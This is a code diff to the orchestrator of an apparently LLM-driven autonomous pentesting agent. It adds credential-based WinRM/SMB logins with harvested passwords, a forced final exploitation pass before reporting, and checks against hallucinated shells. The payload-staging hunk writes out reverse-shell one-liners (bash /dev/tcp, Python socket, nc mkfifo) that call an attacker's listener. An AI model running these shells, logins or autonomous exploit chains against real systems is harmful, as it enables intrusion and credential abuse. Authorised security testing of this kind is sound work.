+            from agents.recon import target_resolver as _tr
+            if not _tr.uses_vhost(self._intel):
+                import subprocess as _sp
+                _pp = web_ports[0] if web_ports else 80
+                _scheme = "https" if int(str(_pp).split("/")[0]) in (443, 8443) else "http"
+                _cp = _sp.run(
+                    ["curl", "-sS", "-I", "-m", "8", "-k",
+                     f"{_scheme}://{target}:{_pp}/"],
+                    capture_output=True, timeout=12, check=False,
+                )
+                _probe = ((_cp.stdout or b"").decode("utf-8", "replace") +
+                          (_cp.stderr or b"").decode("utf-8", "replace"))
+                from agents.recon.vhost_pivot import extract_hostnames, remap_vhosts
+                _vh = extract_hostnames(_probe)
+                if _vh:
+                    remap_vhosts(target, _vh)
+                    _tr.record_vhost(self._intel, _vh[0], ip=target, verified=True)
+                    await self.emit_reasoning(
+                        step       = "vhost_preprobe",
+                        reasoning  = (f"Port {_pp} on {target} redirects to vhost "
+                                      f"{_vh[0]} — that hostname is the real web app. "
+                                      f"All web tools will target it."),
+                        decision   = f"SET web target = http://{_vh[0]}/",
+                        next_action= "Run web testing against the vhost, not the bare IP",
+                    )
+        except Exception:
+            pass
 
         from agents.web_agent import WebAgent
         agent = WebAgent(broadcast=self.broadcast)
@@ -6020,6 +6509,32 @@ class MasterAgent(BaseAgent):
     # gates (necessary basis + circuit breaker + budget) as a regular
     # subagent tool call, so this is NOT an escape hatch around the
     # safety layers — it's a phase-ordering optimisation.
+    def _first_strike_already_run(self, cmd: str) -> bool:
+        """Shared cross-consumer ledger for OSINT ``next_commands`` / first-strike
+        shell commands.
+
+        `next_commands` is read by THREE uncoordinated executors —
+        ``_inline_first_strike`` (OSINT phase), the ``_phase_exploit``
+        first-strike loop, and the entry-attempt dispatcher's
+        ``pre_staged_commands`` — and is never drained.  Combined with
+        ``_phase_exploit`` running up to 3× (bootstrap / stall-escalation /
+        compromise-gate), the SAME heavy command (e.g. an ~11-min
+        ``nmap -p- && nuclei`` chain) fired back-to-back.  This ledger makes a
+        given normalized command execute AT MOST ONCE per engagement.  Returns
+        True if the command already ran (caller should skip).
+        """
+        sig = " ".join((cmd or "").split())[:300]
+        if not sig:
+            return True
+        seen = getattr(self, "_first_strike_sigs", None)
+        if seen is None:
+            seen = set()
+            self._first_strike_sigs = seen
+        if sig in seen:
+            return True
+        seen.add(sig)
+        return False
+
     async def _inline_first_strike(self, target: str,
                                        max_commands: int = 3) -> None:
         cmds: List[str] = list(self._intel.get("next_commands") or [])
@@ -6035,6 +6550,9 @@ class MasterAgent(BaseAgent):
             # Strip trailing comments ("# CVE-…")
             cmd_no_comment = cmd.split("#", 1)[0].strip()
             if not cmd_no_comment:
+                continue
+            # Shared ledger — skip if another consumer already ran this command.
+            if self._first_strike_already_run(cmd_no_comment):
                 continue
             # Pre-flight: consult engagement context's basis + circuit
             # breaker gates BEFORE dispatch.  Refused commands are
@@ -6226,6 +6744,10 @@ class MasterAgent(BaseAgent):
                         break
                     if ctx.is_post_exploit_mode():
                         break
+                    # Shared ledger — don't re-run a command already executed by
+                    # the OSINT inline / _phase_exploit first-strike consumers.
+                    if self._first_strike_already_run(cmd):
+                        continue
                     try:
                         await self._dispatch_to_agent(
                             tool="bash", args=cmd,
@@ -6327,6 +6849,44 @@ class MasterAgent(BaseAgent):
                 return
         except Exception:
             pass
+
+        # ── Exploitability triage (initial-access only) ──────────────────────
+        # A real tester never fires at CVEs that can't yield access.  Drop
+        # DoS / info-leak / client-side / local-privesc / fabricated CVEs so the
+        # exploit budget AND the LLM synthesis target only access primitives.
+        # If triage empties the list, that's a signal to pursue the WEB surface
+        # (Tier-1 web chains) instead of CVE/synthesis exploitation.
+        try:
+            from agents.exploit.exploitability import triage as _cve_triage
+            from datetime import datetime as _dt
+            _descr: Dict[str, str] = {}
+            for _v in (self._intel.get("vulnerabilities") or []):
+                if isinstance(_v, dict):
+                    _vc = _v.get("cves") or ([_v.get("cve")] if _v.get("cve") else [])
+                    for _c in _vc:
+                        if _c:
+                            _descr[str(_c).upper()] = _v.get("description") or _v.get("title") or ""
+            _kept, _dropped = _cve_triage(
+                list(cves), current_year=_dt.utcnow().year, descriptions=_descr)
+            if _dropped:
+                await self.emit_reasoning(
+                    step       = "cve_exploitability_triage",
+                    reasoning  = (
+                        f"Triaged {len(cves)} CVE(s) for initial-access viability. "
+                        f"Dropped {len(_dropped)} non-access: "
+                        + "; ".join(f"{c} ({r})" for c, r in _dropped[:6])
+                    ),
+                    decision   = (
+                        f"Pursue {len(_kept)} access-relevant CVE(s)"
+                        if _kept else
+                        "No access-relevant CVE — pivot to web-surface exploitation"
+                    ),
+                    next_action= "Exploit only what can land a foothold",
+                )
+            cves = _kept
+        except Exception:
+            pass
+
         try:
             from agents.exploit.exploit_orchestrator import ExploitOrchestrator
             import db.mongo_client as _db
@@ -6357,17 +6917,32 @@ class MasterAgent(BaseAgent):
                 next_action= "Run parallel exploit chains; a landed shell pivots to post-exploit",
             )
 
-            res = await orch.run(
-                session_id = self._session_id,
-                target     = target,
-                db         = _db.get_db(),
-                services   = services,
-                cves       = list(cves),
-                open_ports = self._intel.get("open_ports", []),
-                web_urls   = web_urls,
-                lhost      = lhost,
-                lport      = lport,
-            )
+            # C10 — don't race a second orchestrator if _phase_exploit's is live.
+            if getattr(self, "_exploit_orch_active", False):
+                await self.emit_reasoning(
+                    step       = "exploit_orch_dedup",
+                    reasoning  = ("An ExploitOrchestrator is already running for "
+                                  "this engagement — not racing a second one for "
+                                  "these CVEs."),
+                    decision   = "SKIP duplicate concurrent orchestrator",
+                    next_action= "Let the in-flight orchestrator finish",
+                )
+                return
+            self._exploit_orch_active = True
+            try:
+                res = await orch.run(
+                    session_id = self._session_id,
+                    target     = target,
+                    db         = _db.get_db(),
+                    services   = services,
+                    cves       = list(cves),
+                    open_ports = self._intel.get("open_ports", []),
+                    web_urls   = web_urls,
+                    lhost      = lhost,
+                    lport      = lport,
+                )
+            finally:
+                self._exploit_orch_active = False
 
             if isinstance(res, dict) and res.get("shell_obtained"):
                 try:
@@ -6380,12 +6955,14 @@ class MasterAgent(BaseAgent):
                     )
                 except Exception:
                     pass
-            else:
+            elif cves:
                 # ── TIER 2: LLM exploit-code synthesis ──────────────────
                 # Tier-1 (public exploits + built payloads) landed nothing.
-                # Escalate to bespoke LLM-synthesized exploit code, streamed
-                # live to the Exploit Lab panel.  Still parallel — we're in
-                # the entry-attempt dispatcher's background task.
+                # Escalate to bespoke LLM-synthesized exploit code ONLY when an
+                # access-relevant CVE survived triage — synthesizing a remote
+                # RCE from "no real vuln, just a web port" is what produced the
+                # garbage prompts the model refused.  No CVE → rely on the
+                # Tier-1 web chains (web_exploit) instead.
                 tier1_out = str((res or {}).get("evidence") or "") if isinstance(res, dict) else ""
                 await self._attempt_synth_exploitation(
                     target      = target,
@@ -6491,6 +7068,101 @@ class MasterAgent(BaseAgent):
 
     # ─── PHASE: Exploitation ──────────────────────────────────
 
+    def _detect_target_os(self) -> str:
+        """Reliably classify the target OS and cache it into intel['os_guess'].
+
+        ROOT CAUSE FIX: nmap -O is root-only, so when ARGUS is not root the
+        OS guess stays 'unknown' — which mis-routed every tech-specific stage
+        (a Windows AD DC was handed a Linux msfvenom payload and the WinRM
+        shell path was skipped).  This derives the OS from the unprivileged
+        `-sV` service banners + the open-port fingerprint (always available),
+        so os_guess is dependable regardless of privilege level.
+
+        Returns normalised ``'windows'`` / ``'linux'`` / ``''`` and never raises.
+        """
+        cur = (self._intel.get("os_guess") or "").strip().lower()
+        if cur and cur != "unknown":
+            if "windows" in cur:
+                return "windows"
+            if any(x in cur for x in ("linux", "ubuntu", "debian", "centos",
+                                      "unix", "bsd", "rhel", "fedora")):
+                return "linux"
+            # Concrete-but-unrecognised guess — re-derive below.
+        try:
+            from agents.exploit.exploitability import infer_os
+            os_kind = infer_os(self._intel)
+        except Exception:
+            os_kind = ""
+        if os_kind and cur in ("", "unknown"):
+            self._intel["os_guess"] = os_kind.capitalize()
+        return os_kind
+
+    async def _attempt_windows_credential_shell(
+        self, target: str, creds: list, ports: set
+    ) -> None:
+        """Tech-correct Windows foothold: authenticate with harvested creds.
+
+        For a Windows / AD host with valid credentials the real-world play is
+        a credential LOGIN (evil-winrm over WinRM, or an SMB exec primitive) —
+        NOT dropping a Linux reverse-shell payload.  Tries WinRM first (lands
+        an interactive shell via the evil-winrm PTY route), then falls back to
+        an SMB validation/share-enum.  Fully guarded; never raises.
+        """
+        try:
+            cred = creds[0] if creds else {}
+            if not isinstance(cred, dict):
+                return
+            user = (cred.get("user") or cred.get("username") or "").strip()
+            pw   = (cred.get("password") or cred.get("pass") or "").strip()
+            dom  = (cred.get("domain") or "").strip()
+            if not user:
+                return
+            uarg = f"{dom}\\{user}" if dom else user
+            await self.emit_reasoning(
+                step       = "windows_cred_foothold",
+                reasoning  = (
+                    f"Windows target with valid credentials ({uarg}) and "
+                    f"WinRM/SMB exposed.  The tech-correct foothold is a "
+                    f"credential login (evil-winrm / netexec), NOT a Linux "
+                    f"reverse-shell payload."
+                ),
+                decision   = "LOGIN with Windows credentials (evil-winrm → SMB fallback)",
+                next_action= "Spawn evil-winrm PTY; on success register an interactive shell",
+            )
+            dflag = f" -d {dom}" if dom else ""
+            if ports & {5985, 5986}:
+                # Validate creds + detect (Pwn3d!) WinRM shell access.
+                await self._dispatch_to_agent(
+                    tool="crackmapexec",
+                    args=f"winrm {target} -u '{user}' -p '{pw}'{dflag}",
+                    purpose="Validate creds + check WinRM shell access (Pwn3d!)",
+                    phase="exploit", timeout=120,
+                )
+                # Spawn the interactive evil-winrm PTY (routes to
+                # _dispatch_evil_winrm, which registers a shell on success and
+                # fails gracefully if the user is not in Remote Management Users).
+                await self._dispatch_to_agent(
+                    tool="evil-winrm",
+                    args=f"-i {target} -u {user} -p {pw}",
+                    purpose="Interactive WinRM shell via harvested credentials",
+                    phase="exploit", timeout=90,
+                )
+            elif ports & {445}:
+                await self._dispatch_to_agent(
+                    tool="crackmapexec",
+                    args=f"smb {target} -u '{user}' -p '{pw}'{dflag} --shares",
+                    purpose="Validate creds via SMB + enumerate shares",
+                    phase="exploit", timeout=120,
+                )
+        except Exception as exc:                                  # noqa: BLE001
+            try:
+                import logging as _lg
+                _lg.getLogger(__name__).warning(
+                    "[win_cred_shell] %s failed: %s", target, exc
+                )
+            except Exception:
+                pass
+
     async def _auto_generate_payload(
         self,
         platform:     str = "linux",
@@ -6537,6 +7209,32 @@ class MasterAgent(BaseAgent):
             )
             self._generated_payloads = (getattr(self, "_generated_payloads", []) or [])
             self._generated_payloads.append(payload)
+            # ── Make the staged payload CONSUMABLE by the exploit layer ──────
+            # Previously _generated_payloads was built but NEVER read, so the
+            # listener waited for a callback that never came.  Stash delivery
+            # primitives + ready reverse-shell one-liners in intel so any RCE
+            # primitive (web_exploit, cmdi, the LLM exploit planner, the
+            # finding-triggers) can deliver the payload or just fire a reverse
+            # shell back to the live listener.
+            try:
+                _lh = lhost or "LHOST"
+                self._intel.setdefault("staged_payloads", []).append({
+                    "platform":     platform, "fmt": fmt,
+                    "path":         payload.get("output_path"),
+                    "lhost":        _lh, "lport": lport,
+                    "listener_cmd": payload.get("listener_cmd"),
+                })
+                self._intel["reverse_shell_oneliners"] = {
+                    "lhost": _lh, "lport": lport,
+                    "bash":   f"bash -c 'bash -i >& /dev/tcp/{_lh}/{lport} 0>&1'",
+                    "python": (f"python3 -c 'import socket,subprocess,os;"
+                               f"s=socket.socket();s.connect((\"{_lh}\",{lport}));"
+                               f"[os.dup2(s.fileno(),f) for f in (0,1,2)];"
+                               f"subprocess.call([\"/bin/sh\",\"-i\"])'"),
+                    "nc":     f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {_lh} {lport} >/tmp/f",
+                }
+            except Exception:
+                pass
             await self.emit_reasoning(
                 step       = "payload_developed",
                 reasoning  = (
@@ -6597,26 +7295,58 @@ class MasterAgent(BaseAgent):
         agent._session_id = self._session_id
         self._exploit_agent = agent
 
-        # ── Pre-stage a reverse-shell payload + listener ─────────────
-        # When the attack surface includes a file-upload / RCE / WAR /
-        # web-shell primitive, having a payload + listener ready BEFORE
-        # the exploit subagents run means a landed RCE converts to an
-        # interactive shell immediately (and the human can grab it in
-        # the Shell Manager).  Chosen platform follows the target OS.
+        # ── Tech-correct foothold staging ────────────────────────────
+        # Route the initial-access attempt to the technology actually
+        # detected — NOT a hardcoded Linux default.  Root-cause of the
+        # "Windows AD DC handed a Linux msfvenom payload" bug: os_guess was
+        # "unknown" (nmap -O is root-only), so the old os_guess substring test
+        # fell through to the Linux branch.  We now classify the OS robustly
+        # from service banners + ports, and for a Windows host with creds we
+        # LOG IN (evil-winrm/SMB) instead of dropping an ELF reverse shell.
         try:
-            _osg = (self._intel.get("os_guess") or "").lower()
-            _web_present = bool(self._intel.get("web_paths")) or any(
-                int(str(p).split("/")[0]) in (80, 443, 8080, 8443, 8000, 8888)
-                for p in (self._intel.get("open_ports") or [])
-                if str(p).split("/")[0].isdigit()
-            )
-            if _web_present and not self._intel.get("shell_access"):
-                if "windows" in _osg:
-                    await self._auto_generate_payload(platform="windows", fmt="exe")
+            _os = self._detect_target_os()      # robust: banners + ports, not just -O
+            _ports = set()
+            for p in (self._intel.get("open_ports") or []):
+                try:
+                    _ports.add(int(str(p).split("/")[0]))
+                except Exception:
+                    continue
+            _web_present = bool(self._intel.get("web_paths")) or bool(
+                _ports & {80, 443, 8080, 8443, 8000, 8888})
+            _creds = self._intel.get("credentials") or []
+            _win_login = bool(_ports & {5985, 5986, 445})
+
+            if not self._intel.get("shell_access"):
+                if _os == "windows":
+                    # Windows: credential login is the foothold; never an ELF.
+                    if _creds and _win_login:
+                        await self._attempt_windows_credential_shell(target, _creds, _ports)
+                    elif _web_present:
+                        await self._auto_generate_payload(platform="windows", fmt="exe")
+                elif _os == "linux":
+                    if _creds and (_ports & {22}):
+                        # SSH login with harvested creds is the Linux analogue.
+                        await self.emit_reasoning(
+                            step="linux_cred_foothold",
+                            reasoning="Linux target with credentials + SSH open — "
+                                      "attempting an authenticated SSH foothold.",
+                            decision="LOGIN via sshpass/ssh with harvested creds",
+                            next_action="Establish interactive SSH session",
+                        )
+                        if _web_present:
+                            await self._auto_generate_payload(platform="linux", fmt="elf")
+                    elif _web_present:
+                        await self._auto_generate_payload(platform="linux", fmt="elf")
                 else:
-                    # Linux web stacks: also stage a language-appropriate
-                    # web shell format the upload subagent can use.
-                    await self._auto_generate_payload(platform="linux", fmt="elf")
+                    # OS still genuinely unknown — use a PORT heuristic instead
+                    # of blindly defaulting to Linux.
+                    if _ports & {445, 135, 139, 3389, 5985, 88, 389}:
+                        if _creds and _win_login:
+                            await self._attempt_windows_credential_shell(target, _creds, _ports)
+                        elif _web_present:
+                            await self._auto_generate_payload(platform="windows", fmt="exe")
+                    elif _web_present:
+                        await self._auto_generate_payload(platform="linux", fmt="elf")
         except Exception:
             pass
 
@@ -6650,6 +7380,11 @@ class MasterAgent(BaseAgent):
                 # Strip trailing comments (LLM often appends "# CVE-...")
                 cmd_no_comment = cmd.split("#", 1)[0].strip()
                 if not cmd_no_comment:
+                    continue
+                # Shared ledger — skip if already run by another consumer
+                # (inline first-strike / entry dispatcher) or a prior
+                # _phase_exploit invocation.  Kills the duplicate 11-min chains.
+                if self._first_strike_already_run(cmd_no_comment):
                     continue
                 # Tool is the first whitespace-separated token; rest is args
                 parts = cmd_no_comment.split(None, 1)
@@ -6974,11 +7709,53 @@ class MasterAgent(BaseAgent):
         # the best vectors without re-running from scratch.
         await self._run_phase_subagents("exploit", target)
 
+    # ─── Live-session verification (anti-hallucination) ───────────────
+    async def _verify_remote_session(self) -> bool:
+        """Prove a live, drivable session executes a command ON THE TARGET.
+
+        ``shell_access == True`` is NOT sufficient — a falsely-registered shell
+        (e.g. the exploit_synth false-positive, which flips the flag but creates
+        no session in intel['shells']) would otherwise drive post-exploit/privesc
+        subagents that run ``cat``/``id``/``grep`` via the LOCAL MCP ``bash`` tool
+        and mislabel the Kali host's output as the target.  We require an actual
+        non-pending session AND that a unique marker round-trips through the real
+        session router (``_execute_shell_command``).
+        """
+        shells = [s for s in (self._intel.get("shells") or [])
+                  if isinstance(s, dict) and not s.get("pending")]
+        if not shells:
+            return False
+        import uuid as _uuid
+        marker = f"ARGUS_LIVE_{_uuid.uuid4().hex[:10]}"
+        try:
+            res = await self._execute_shell_command(command=f"echo {marker}", timeout=20)
+            out = (res or {}).get("stdout", "") if isinstance(res, dict) else str(res or "")
+            return marker in (out or "")
+        except Exception:
+            return False
+
     # ─── PHASE: Post-Exploitation ─────────────────────────────
 
     async def _phase_post_exploit(self, target: str):
         """Master plans post-exploit enumeration. Agent executes."""
         await self._advance_phase(AttackPhase.POST_EXPLOIT)
+
+        # ── F3 anti-hallucination gate ──────────────────────────────
+        # If shell_access is set but NO live session can actually run a marker
+        # on the target, the "shell" is fake (e.g. exploit_synth false-positive).
+        # Running post-exploit anyway executes cat/id/grep on the LOCAL Kali box
+        # and reports them as the target (the "thought it had a shell but was
+        # completely off" bug).  Correct the flag and refuse.
+        if self._intel.get("shell_access") and not await self._verify_remote_session():
+            self._intel["shell_access"] = False
+            await self.emit_reasoning(
+                step       = "post_exploit_unverified_session",
+                reasoning  = ("shell_access was set but no live remote session could "
+                              "execute a marker on the target — the foothold is "
+                              "unverified/fake.  Refusing to run post-exploit locally."),
+                decision   = "SKIP POST_EXPLOIT (unverified session); reset shell_access",
+                next_action= "Establish a REAL session (reverse shell / SSH) before post-ex",
+            )
 
         # ── Foothold gate (Overpass-3 post-mortem) ──────────────────
         # POST_EXPLOIT enumeration + the lateral AD subagents only make
@@ -7064,6 +7841,29 @@ class MasterAgent(BaseAgent):
         and plans next step. Continues until root or vectors exhausted.
         """
         await self._advance_phase(AttackPhase.PRIVESC)
+
+        # ── F3 anti-hallucination gate (same as post-exploit) ───────
+        # Privesc enumerators run id/find/cat etc. via the LOCAL MCP bash tool.
+        # Without a verified live session on the target they enumerate the Kali
+        # host and "confirm root" on ourselves.  Refuse unless a marker round-
+        # trips through a real session.
+        if not await self._verify_remote_session():
+            self._intel["shell_access"] = False
+            await self.emit_reasoning(
+                step       = "privesc_unverified_session",
+                reasoning  = ("No live remote session could execute a marker on the "
+                              "target — skipping privilege escalation to avoid "
+                              "enumerating (and 'confirming root' on) the local host."),
+                decision   = "SKIP PRIVESC (unverified session)",
+                next_action= "Establish a REAL session before privilege escalation",
+            )
+            await self._emit("plan_step_update", {
+                "step_id": "privesc", "status": "skipped",
+                "result":  "No verified remote session — privesc deferred",
+                "detail":  "", "found": False, "ts": datetime.utcnow().isoformat()
+            })
+            return
+
         await self._emit("plan_step_update", {
             "step_id": "privesc", "status": "active",
             "result":  f"Attempting privilege escalation as {self._intel.get('current_user','unknown')}",
@@ -7793,25 +8593,171 @@ Return JSON:
 
     # ─── PHASE: Reporting ────────────────────────────────────
 
+    def _assess_compromise(self) -> Dict[str, Any]:
+        """Honest verdict on whether the engagement actually achieved (or
+        attempted) a compromise — as opposed to merely cataloguing version-
+        matched CVEs.
+
+        Levels:
+          • ``compromised`` — a shell/elevated shell or a captured flag exists.
+          • ``partial``     — real foothold *progress*: harvested credentials,
+                              looted secrets, or a VERIFIED exploit/RCE finding.
+          • ``recon_only``  — nothing but recon + unverified version CVEs.  This
+                              is NOT a result; the final-compromise gate forces
+                              one more genuine exploitation pass before reporting.
+
+        Operator-PROVIDED credentials do not count as progress on their own —
+        the point is to *use* them for a foothold.
+        """
+        it = self._intel
+
+        shell = bool(it.get("shell_access") or it.get("elevated_shell"))
+        flags = bool(it.get("user_flag") or it.get("root_flag"))
+
+        harvested_creds = False
+        for c in (it.get("credentials") or []):
+            if isinstance(c, dict):
+                src = str(c.get("source", "")).lower()
+                if "operator" not in src:        # earned, not handed to us
+                    harvested_creds = True
+                    break
+
+        loot = bool(it.get("loot"))
+
+        verified_exploit = False
+        for bucket in ("vulnerabilities", "web_vulns"):
+            for v in (it.get(bucket) or []):
+                if isinstance(v, dict) and (
+                    v.get("verified") or v.get("exploited") or v.get("rce")
+                ):
+                    verified_exploit = True
+                    break
+            if verified_exploit:
+                break
+
+        compromised       = shell or flags
+        foothold_progress = compromised or harvested_creds or loot or verified_exploit
+
+        if compromised:
+            level = "compromised"
+        elif foothold_progress:
+            level = "partial"
+        else:
+            level = "recon_only"
+
+        return {
+            "compromised":       compromised,
+            "foothold_progress": foothold_progress,
+            "level":             level,
+            "shell":             shell,
+            "flags":             flags,
+            "harvested_creds":   harvested_creds,
+            "loot":              loot,
+            "verified_exploit":  verified_exploit,
+        }
+
+    async def _final_compromise_gate(self, session_id: str, target: str) -> None:
+        """Refuse to report a pure recon/CVE-list as a finished engagement.
+
+        ARGUS's objective is COMPROMISE, not vulnerability enumeration.  If the
+        engagement is about to enter REPORTING with no shell, no captured flag,
+        no harvested creds, no looted secret and no VERIFIED exploit — i.e. it
+        only produced recon + unverified version CVEs — force ONE final,
+        genuine exploitation pass (exploit phase → orchestrator → Tier-2 synth,
+        plus any harvested-credential login).  One-shot and guarded so it can
+        never loop.  Always records an honest ``engagement_outcome`` for the
+        report.  Never raises into the teardown path.
+        """
+        try:
+            assess = self._assess_compromise()
+            self._intel["engagement_outcome"] = assess["level"]
+            self._intel["compromised"]        = assess["compromised"]
+
+            if assess["foothold_progress"] or getattr(self, "_final_push_done", False):
+                # Either we made genuine progress, or we already spent our one
+                # forced push — reporting is now warranted.
+                return
+
+            self._final_push_done = True
+            await self.emit_reasoning(
+                step       = "compromise_gate",
+                reasoning  = (
+                    "Engagement reached REPORTING with NO shell, NO flag, NO "
+                    "harvested credentials and NO verified exploit — only recon "
+                    "and unverified version CVEs.  That is a vulnerability list, "
+                    "not a compromise.  Forcing a final exploitation pass against "
+                    "the real attack surface before any report is written."
+                ),
+                decision   = "FORCE final exploitation pass (no foothold yet)",
+                next_action= "Re-run exploit phase + orchestrator + synth against the live app/creds",
+            )
+            try:
+                await self._emit("compromise_gate", {
+                    "session_id": session_id,
+                    "outcome_before": assess["level"],
+                    "forced_push":    True,
+                })
+            except Exception:
+                pass
+
+            # The one genuine push: re-enter the exploit phase (orchestrator +
+            # synth + credentialed-login path), then let any background subagent
+            # finish before we judge the result.
+            try:
+                await self._phase_exploit(target)
+            except Exception as exc:
+                import logging as _l
+                _l.getLogger(__name__).warning("[compromise_gate] forced exploit error: %s", exc)
+            try:
+                await self._wait_for_agents_idle(timeout=180.0)
+            except Exception:
+                pass
+
+            assess2 = self._assess_compromise()
+            self._intel["engagement_outcome"] = assess2["level"]
+            self._intel["compromised"]        = assess2["compromised"]
+            await self.emit_reasoning(
+                step       = "compromise_gate_result",
+                reasoning  = (
+                    f"Post-push verdict: {assess2['level']} "
+                    f"(shell={assess2['shell']} flags={assess2['flags']} "
+                    f"creds={assess2['harvested_creds']} "
+                    f"verified_exploit={assess2['verified_exploit']})."
+                ),
+                decision   = (
+                    "Compromise achieved — proceeding to report"
+                    if assess2["compromised"]
+                    else "Still no foothold — report will be flagged NO-COMPROMISE"
+                ),
+                next_action= "Generate report",
+            )
+        except Exception as exc:
+            import logging as _l
+            _l.getLogger(__name__).warning("[compromise_gate] non-fatal: %s", exc)
+
     async def _phase_reporting(self, session_id: str, target: str):
         await self._advance_phase(AttackPhase.REPORTING)
         await self.set_status(AgentStatus.THINKING, "Generating executive report")
 
-        findings = await db.get_findings(session_id)
-        flags    = await db.get_flags(session_id)
-        summary  = await db.get_findings_summary(session_id)
+        # Guard every DB result: these can return None, and `None[:12]` /
+        # `None.get(...)` is the recurring 'NoneType object is not subscriptable'
+        # crash that has aborted report generation on every recent run.
+        findings = await db.get_findings(session_id) or []
+        flags    = await db.get_flags(session_id) or []
+        summary  = await db.get_findings_summary(session_id) or {}
 
         # Build structured finding details for the LLM
         finding_details = []
         for f in findings[:12]:
-            sev   = f.get("severity", "?").upper()
-            title = f.get("title", "?")
-            host  = f.get("host", target)
-            port  = f.get("port", "")
-            svc   = f.get("service", "")
-            cves  = ", ".join(f.get("cves", [])[:3])
-            desc  = f.get("description", "")[:200]
-            rem   = (f.get("extra") or {}).get("remediation", "")[:150]
+            f     = f or {}
+            sev   = (f.get("severity") or "?").upper()
+            title = f.get("title") or "?"
+            host  = f.get("host") or target
+            port  = f.get("port") or ""
+            svc   = f.get("service") or ""
+            cves  = ", ".join((f.get("cves") or [])[:3])
+            desc  = (f.get("description") or "")[:200]
+            rem   = ((f.get("extra") or {}).get("remediation") or "")[:150]
             line  = f"[{sev}] {title}"
             if port: line += f" — {host}:{port}"
             if svc:  line += f" ({svc})"
@@ -7826,9 +8772,10 @@ Return JSON:
                               f"(found at {fl.get('location','?')})")
 
         attack_path_lines = []
-        for i, step in enumerate(self._intel.get("attack_path", []), 1):
+        for i, step in enumerate(self._intel.get("attack_path") or [], 1):
+            step = step or {}
             attack_path_lines.append(
-                f"  {i}. [{step.get('phase','?').upper()}] {step.get('result','')}"
+                f"  {i}. [{(step.get('phase') or '?').upper()}] {step.get('result') or ''}"
             )
 
         intel_ctx = self._intel_summary()
@@ -7842,11 +8789,11 @@ Return JSON:
         evidence_items = []
         mitre_mappings = []
         try:
-            evidence_items = await db.get_evidence(session_id)
-            mitre_mappings = await db.get_mitre_mappings(session_id)
+            evidence_items = await db.get_evidence(session_id) or []
+            mitre_mappings = await db.get_mitre_mappings(session_id) or []
         except Exception:
-            evidence_items = self._intel.get("evidence", [])
-            mitre_mappings = self._intel.get("mitre_techniques", [])
+            evidence_items = self._intel.get("evidence") or []
+            mitre_mappings = self._intel.get("mitre_techniques") or []
 
         # Build MITRE ATT&CK table
         mitre_lines = []
@@ -7897,6 +8844,12 @@ ATTACK PATH TAKEN:
 {chr(10).join(attack_path_lines) if attack_path_lines else "  No attack path recorded."}
 
 SHELL ACCESS: {'YES — compromised as: ' + str(self._intel.get('current_user','?')) if self._intel.get('shell_access') else 'No shell obtained'}
+
+ENGAGEMENT OUTCOME: {str(self._intel.get('engagement_outcome','recon_only')).upper()} (compromised={bool(self._intel.get('compromised'))})
+  NOTE: if outcome is RECON_ONLY, NO foothold was achieved — the listed CVEs
+  are UNVERIFIED version matches, NOT confirmed/exploited vulnerabilities. The
+  report MUST state plainly that the target was NOT compromised and must NOT
+  imply the version-matched CVEs were exploited.
 
 ATTACK TREE ASSESSMENT:
 {tree_summary if tree_summary else "  Not available"}
@@ -9801,7 +10754,9 @@ Return JSON with enumeration goals: {{
             if sp.get("priority_ports"):
                 lines.append(f"  Priority ports : {', '.join(str(p) for p in sp['priority_ports'][:12])}")
             if sp.get("priority_cves"):
-                lines.append(f"  Priority CVEs  : {', '.join(sp['priority_cves'][:8])}")
+                _pc = [(c.get('cve') or str(c)) if isinstance(c, dict) else str(c)
+                       for c in sp['priority_cves'][:8]]
+                lines.append(f"  Priority CVEs  : {', '.join(s for s in _pc if s)}")
             if sp.get("priority_paths"):
                 lines.append(f"  Priority paths : {', '.join(sp['priority_paths'][:8])}")
             if sp.get("priority_hosts"):
@@ -9827,9 +10782,15 @@ Return JSON with enumeration goals: {{
         if techs:
             lines.append(f"Technologies: {_safe_join(techs[:8])}")
 
-        cves = i.get('cves', [])
+        cves = i.get('cves', []) or []
         if cves:
-            lines.append(f"CVEs found  : {', '.join(cves[:10])}")
+            # intel['cves'] may hold plain CVE-ID strings OR dicts
+            # ({'cve','severity',...} from cve_lookup) — coerce to IDs so the
+            # join never hits "expected str instance, dict found" (the recurring
+            # report-gen crash).
+            cve_strs = [(c.get('cve') or str(c)) if isinstance(c, dict) else str(c)
+                        for c in cves[:10]]
+            lines.append(f"CVEs found  : {', '.join(s for s in cve_strs if s)}")
 
         vulns = i.get('vulnerabilities', [])
         if vulns:
@@ -9906,7 +10867,10 @@ Return JSON with enumeration goals: {{
         banners = i.get("banners", {})
         if banners:
             for tool, banner in banners.items():
-                lines.append(f"Banner ({tool}): {banner[:100]}")
+                # banner may be a dict (structured) not a str — coerce so the
+                # slice never raises KeyError(slice(None,100,None)) and aborts
+                # the whole report.
+                lines.append(f"Banner ({tool}): {str(banner)[:100]}")
 
         # Enumeration findings (structured)
         enum_findings = i.get("enum_findings", [])
